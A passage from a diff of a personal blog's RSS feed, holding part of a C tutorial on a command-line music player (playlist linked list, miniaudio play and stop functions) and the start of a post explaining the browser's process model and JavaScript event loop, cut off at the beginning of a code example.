+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;This is the first song.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">prev&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">clearScreen&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Playing %s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cursor&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">node&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="example-of-the-playlist">Example of the Playlist&lt;/h5>
+&lt;p>&lt;img src="https://xph0816.github.io/p/c-music-player/playlist-visualization.svg"
+loading="lazy"
+alt="Playlist Visualization"
+>&lt;/p>
+&lt;h3 id="backend-implementation">Backend Implementation&lt;/h3>
+&lt;h4 id="player-implementation">Player Implementation&lt;/h4>
+&lt;p>Next, we will build the core functionality of the music player. This includes loading songs, playing, pausing, and stopping playback. We will use the double linked list to manage the playlist. Now, we define the player structure and the corresponding functions.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">Player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ma_sound&lt;/span> &lt;span class="n">sound&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ma_engine&lt;/span> &lt;span class="n">engine&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">player&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;code>Player&lt;/code> structure contains the &lt;code>miniaudio&lt;/code> sound and engine objects, which are used to play audio files. We will implement the following &lt;code>play&lt;/code> function to play the selected song.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">play&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;./music/&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;.mp3&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;./music/&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">path&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;.mp3&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">stop&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ma_result&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">ma_engine_init&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">engine&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">MA_SUCCESS&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed to initialize audio engine.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">ma_sound_init_from_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">engine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sound&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">result&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="n">MA_SUCCESS&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Failed to load sound file.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ma_sound_set_looping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sound&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MA_TRUE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ma_sound_start&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sound&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;code>play&lt;/code> function takes the path to the audio file as an argument and plays the file using the &lt;code>miniaudio&lt;/code> library. It first stops the current playback, initializes the audio engine, and loads the sound file. Finally, it starts playing the sound.&lt;/p>
+&lt;h4 id="stop-function">Stop Function&lt;/h4>
+&lt;p>The &lt;code>stop&lt;/code> function stops the current playback and cleans up the audio engine and sound objects.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">stop&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nf">ma_sound_is_playing&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sound&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ma_sound_stop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sound&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ma_sound_uninit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">sound&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">ma_engine_uninit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">engine&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The &lt;code>stop&lt;/code> function checks if the sound is currently playing and stops it. It then uninitializes the sound and engine objects.&lt;/p>
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>In this blog post, we have laid the foundation for a CLI Music Player using C. We discussed the importance of such a project, set up the project structure, and implemented a double linked list to manage the playlist. In future posts, we will expand on this by adding more features and improving the user interface.&lt;/p>
+&lt;p>Stay tuned for more updates and happy coding!&lt;/p>
+&lt;h2 id="references">References&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://github.com/XPH0816/DSA-Project" target="_blank" rel="noopener"
+>GitHub Repository&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>Event Loop</title><link>https://xph0816.github.io/p/event-loop/</link><pubDate>Sat, 19 Aug 2023 00:00:00 +0800</pubDate><guid>https://xph0816.github.io/p/event-loop/</guid><description>&lt;img src="https://developer.chrome.com/static/blog/inside-browser-part1/image/browser-architecture-9d143004c2a63_856.png" alt="Featured image of post Event Loop" />&lt;h2 id="process-model-of-browser">Process Model of Browser&lt;/h2>
+&lt;hr>
+&lt;h3 id="what-is-a-process">What is a Process?&lt;/h3>
+&lt;p>Every program has their own memory space, and the program can only access the memory space of itself. This memory space is called &lt;strong>Process&lt;/strong>.&lt;/p>
+&lt;p>Each program has at least one process, and processes are isolated from each other. If a program wants to access the memory space of another program, it must use &lt;strong>Inter-Process Communication&lt;/strong>, and need to be authorized by the operating system.&lt;/p>
+&lt;hr>
+&lt;h3 id="what-is-a-thread">What is a Thread?&lt;/h3>
+&lt;p>Once a process is created, it will have at least one thread, which is called &lt;strong>Main Thread&lt;/strong>.
+If the program wants to do multiple things at the same time, it needs to create multiple threads.&lt;/p>
+&lt;hr>
+&lt;h3 id="browser-have-which-processes-and-threads">Browser have which processes and threads?&lt;/h3>
+&lt;p>Browser is a multi-process and multi-threaded program.
+Multi-process uses to reduce the risk of crash, when open the browser, it will automatically create many processes.
+The main processes are:&lt;/p>
+&lt;ul>
+&lt;li>Browser Process&lt;/li>
+&lt;li>Network Process&lt;/li>
+&lt;li>Renderer Process&lt;/li>
+&lt;li>GPU Process&lt;/li>
+&lt;li>Storage Service Process&lt;/li>
+&lt;li>Audio Service Process&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://xph0816.github.io/p/event-loop/browser-process.png"
+width="1294"
+height="493"
+srcset="https://xph0816.github.io/p/event-loop/browser-process_hu4987a3a4161049fecad3d666a92a45ca_36462_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/event-loop/browser-process_hu4987a3a4161049fecad3d666a92a45ca_36462_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Proof of Browser Process"
+class="gallery-image"
+data-flex-grow="262"
+data-flex-basis="629px"
+>&lt;/p>
+&lt;p>The Most important processes are:&lt;/p>
+&lt;ol>
+&lt;li>Browser Process
+&lt;ul>
+&lt;li>Mainly responsible for interface display, user interaction, sub-process management, etc. The browser process will start multiple threads to handle different tasks.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Network Process
+&lt;ul>
+&lt;li>Responsible for loading network resources. The network process will start multiple threads to handle different network tasks.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Renderer Process&lt;/strong> (The main process we will talk about in this lesson)
+&lt;ul>
+&lt;li>After the renderer process is started, it will open a &lt;strong>Renderer Main Thread&lt;/strong>, which is responsible for executing HTML, CSS, and JS code.&lt;/li>
+&lt;li>By default, the browser will open a new renderer process for each tab to ensure that different tabs do not affect each other.&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>This default mode may change in the future. Interested students can refer to the &lt;a class="link" href="https://chromium.googlesource.com/chromium/src/&amp;#43;/main/docs/process_model_and_site_isolation.md#Modes-and-Availability" target="_blank" rel="noopener"
+>chrome official documentation&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://developer.chrome.com/static/blog/inside-browser-part1/image/chrome-processes-79aaecca78d23_856.png"
+loading="lazy"
+alt="Process and What it controls"
+>&lt;/p>
+&lt;hr>
+&lt;h3 id="how-does-the-renderer-main-thread-work">How does the Renderer Main Thread work?&lt;/h3>
+&lt;p>The renderer main thread is the busiest thread in the browser. The tasks it needs to handle include but are not limited to:&lt;/p>
+&lt;ul>
+&lt;li>Parse HTML&lt;/li>
+&lt;li>Parse CSS&lt;/li>
+&lt;li>Calculate style&lt;/li>
+&lt;li>Layout&lt;/li>
+&lt;li>Paint&lt;/li>
+&lt;li>Compositing&lt;/li>
+&lt;li>Every frame rendering (60fps)&lt;/li>
+&lt;li>Execute JS code&lt;/li>
+&lt;li>Handle user interaction&lt;/li>
+&lt;li>Handle timer events&lt;/li>
+&lt;li>Handle network events&lt;/li>
+&lt;li>&amp;hellip;&amp;hellip; and more&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>Q: Why render process don&amp;rsquo;t use multiple threads to handle these tasks?&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>A: Because the tasks are related to each other, and the order of execution is very important. If multiple threads are used to handle these tasks, it will be very difficult to ensure the order of execution.&lt;/p>
+&lt;/blockquote>
+&lt;p>Main render thread faces a lot of tasks, and how does it schedule these tasks?
+example:&lt;/p>
+&lt;ul>
+&lt;li>When the main thread is executing a JS code, how does it handle the user&amp;rsquo;s click event?&lt;/li>
+&lt;li>When the main thread is executing a JS code, the timer event is triggered, how does it handle the timer event?&lt;/li>
+&lt;li>Browser process annouce that user click a button, and the same time, the timer event is triggered, how does the main thread handle these two events?&lt;/li>
+&lt;li>&amp;hellip;&lt;/li>
+&lt;/ul>
+&lt;p>Main thread use message queue to schedule these tasks.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/event-loop/message-quering.png"
+width="1030"
+height="446"
+srcset="https://xph0816.github.io/p/event-loop/message-quering_hu2c839b8caecaca8f2c3298d98e521dd5_49833_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/event-loop/message-quering_hu2c839b8caecaca8f2c3298d98e521dd5_49833_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Message Queue"
+class="gallery-image"
+data-flex-grow="230"
+data-flex-basis="554px"
+>&lt;/p>
+&lt;ol>
+&lt;li>From the beginning, main thread will enter the &lt;strong>Event Loop&lt;/strong>.&lt;/li>
+&lt;li>Event Loop will check if there is any task in the &lt;strong>Message Queue&lt;/strong>. If there is a task, it will take the task out of the message queue and execute it immediately. If not, it will wait for the task to be added to the message queue and enter the sleep state.&lt;/li>
+&lt;li>Other threads (including other threads in the other processes) can add tasks to the message queue at any time. New tasks will be added to the end of the message queue. When new tasks are added, the main thread will wake up and take the task out of the message queue and execute it immediately.&lt;/li>
+&lt;/ol>
+&lt;p>In this way, each task can be carried out in an orderly and continuous manner&lt;/p>
+&lt;p>&lt;strong>The Whole Process is called Event Loop&lt;/strong>&lt;/p>
+&lt;h2 id="some-explaination">Some Explaination&lt;/h2>
+&lt;h3 id="what-is-asynchronous">What is Asynchronous?&lt;/h3>
+&lt;p>Code in execution, there will be some tasks that cannot process immediately, Example:&lt;/p>
+&lt;ul>
+&lt;li>Tasks that need to be performed after the timer is triggered &amp;ndash; &lt;code>setTimeout&lt;/code>, &lt;code>setInterval&lt;/code>&lt;/li>
+&lt;li>Tasks that need to be performed after the network request is completed &amp;ndash; &lt;code>fetch&lt;/code>, &lt;code>XMLHttpRequest&lt;/code>&lt;/li>
+&lt;li>Tasks that need to be performed after the user action is triggered &amp;ndash; &lt;code>addEventListener&lt;/code>
+if main thread wait for these tasks to complete, it will block the main thread, and the main thread will not be able to handle other tasks, which will cause the page to freeze.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://xph0816.github.io/p/event-loop/main-thread-block.png"
+width="1134"
+height="456"
+srcset="https://xph0816.github.io/p/event-loop/main-thread-block_hu4230c6300686cf6351e7c3a4c409c313_99857_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/event-loop/main-thread-block_hu4230c6300686cf6351e7c3a4c409c313_99857_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Main Thread Block"
+class="gallery-image"
+data-flex-grow="248"
+data-flex-basis="596px"
+>&lt;/p>
+&lt;p>&lt;strong>Main thread focus on most important tasks, it must not be blocked.&lt;/strong>
+So, browser will use &lt;strong>Asynchronous&lt;/strong> to handle these tasks.
+Use &lt;strong>Asynchronous&lt;/strong> to handle these tasks, the main thread will not be blocked.&lt;/p>
+&lt;p>&lt;img src="https://xph0816.github.io/p/event-loop/main-thread-asynchronous.png"
+width="1172"
+height="500"
+srcset="https://xph0816.github.io/p/event-loop/main-thread-asynchronous_hudf7f154a3e68e4afa1a10d972f07f4f1_96830_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/event-loop/main-thread-asynchronous_hudf7f154a3e68e4afa1a10d972f07f4f1_96830_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Main Thread Asynchronous"
+class="gallery-image"
+data-flex-grow="234"
+data-flex-basis="562px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>Q: How do understand the asynchrony of JS?&lt;/p>
+&lt;p>Answer: JS is a single-threaded language, this is because the execution of JS code is performed in the main thread and main render thread is just only one thread and the main render thread need to handle a lot of tasks, like rendering, executing JS code, handling user interaction, handling timer events, handling network events, etc. Using synchronous to handle these tasks, the busy main thread will waste time in vain, and on the other hand, the page cannot be updated in time, causing the user to be stuck in the page. So the browser uses an asynchronous way to avoid it. The specific method is that when certain tasks occur, such as timers, network, and event monitoring, the main thread will hand over the tasks to other threads for processing, and immediately end the execution of the tasks by itself, and then execute subsequent codes. When other threads complete, wrap the callback function passed in advance into a task, add it to the end of the message queue, and wait for the main thread to schedule execution. In this asynchronous mode, the browser will never block, thus ensuring the smooth operation of single thread to the greatest extent.&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="how-js-block-the-rendering">How JS block the rendering?&lt;/h3>
+&lt;p>Here is an example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h1&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Hello World!&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h1&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>change&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">button&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">h1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;h1&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">btn&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;button&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// 死循环指定的时间
